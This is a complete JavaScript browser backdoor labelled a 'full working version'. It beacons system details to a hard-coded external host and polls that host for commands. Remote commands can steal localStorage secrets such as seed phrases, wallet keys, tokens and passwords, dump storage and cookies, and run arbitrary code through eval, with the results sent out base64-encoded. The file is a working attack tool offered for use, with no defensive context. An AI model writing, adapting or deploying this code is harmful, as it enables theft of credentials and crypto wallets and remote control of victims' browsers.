// ============================================================
//  BACKDOOR.JS — FULL WORKING VERSION
//  Sends to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
// ============================================================

(function() {
    'use strict';

    // ===== YOUR RECEIVER URL =====
    const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';
    const CMD_URL = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd';

    // ===== SESSION ID =====
    function getSession() {
        if (!localStorage.getItem('_bckdr_sid')) {
            const sid = Date.now() + '-' + Math.random().toString(36).slice(2);
            localStorage.setItem('_bckdr_sid', sid);
        }
        return localStorage.getItem('_bckdr_sid');
    }

    // ===== SEND DATA =====
    function sendData(data) {
        const payload = {
            session: getSession(),
            url: location.href,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            data: data
        };

        try {
            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
            navigator.sendBeacon(RECEIVER, encoded);
        } catch(e) {}

        try {
            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
            fetch(RECEIVER, {
                method: 'POST',
                body: encoded,
                headers: { 'Content-Type': 'text/plain' },
                mode: 'no-cors'
            }).catch(() => {});
        } catch(e) {}

        console.log('📤 Data sent to:', RECEIVER);
    }

    // ===== EXECUTE COMMANDS =====
    function executeCommand(command) {
        let result = '';

        if (command === 'help') {
            result = 'Commands: help, ping, status, keys, dump, js:code';
        } else if (command === 'ping') {
            result = 'pong';
        } else if (command === 'status') {
            result = 'Backdoor running. Session: ' + getSession();
        } else if (command === 'keys') {
            const keys = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (/(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(key) || /(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(val)) {
                    keys.push({ key, value: val });
                }
            }
            result = JSON.stringify(keys, null, 2);
        } else if (command === 'dump') {
            result = JSON.stringify({
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                cookies: document.cookie
            }, null, 2);
        } else if (command.startsWith('js:')) {
            try {
                const code = command.slice(3);
                const evalResult = eval(code);
                result = typeof evalResult === 'string' ? evalResult : JSON.stringify(evalResult, null, 2);
            } catch(e) {
                result = 'Error: ' + e.message;
            }
        } else {
            result = 'Unknown command. Type "help" for available commands.';
        }

        return result;
    }

    // ============================================================
    //  HEARTBEAT + COMMAND CHECK
    // ============================================================

    function startHeartbeat() {
        sendData({ type: 'heartbeat', session: getSession() });

        setInterval(() => {
            sendData({ type: 'heartbeat', session: getSession() });
        }, 30000);

        // Check for commands every 30 seconds
        setInterval(() => {
            const sid = getSession();
            fetch(CMD_URL + '?sid=' + sid)
                .then(r => r.json())
                .then(commands => {
                    if (commands && commands.length > 0) {
                        commands.forEach(cmd => {
                            const result = executeCommand(cmd);
                            sendData({ type: 'command_result', command: cmd, result: result });
                        });
                    }
                })
                .catch(() => {});
        }, 30000);
    }

    // ============================================================
    //  INIT
    // ============================================================

    function init() {
        console.log('🔥 Backdoor loaded!');
        console.log('📡 Receiver:', RECEIVER);
        console.log('🔑 Session:', getSession());
        console.log('ℹ️ Commands: help, ping, status, keys, dump, js:code');

        // Send initial system info
        sendData({
            type: 'system_info',
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screen: window.screen.width + 'x' + window.screen.height,
            language: navigator.language
        });

        startHeartbeat();
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
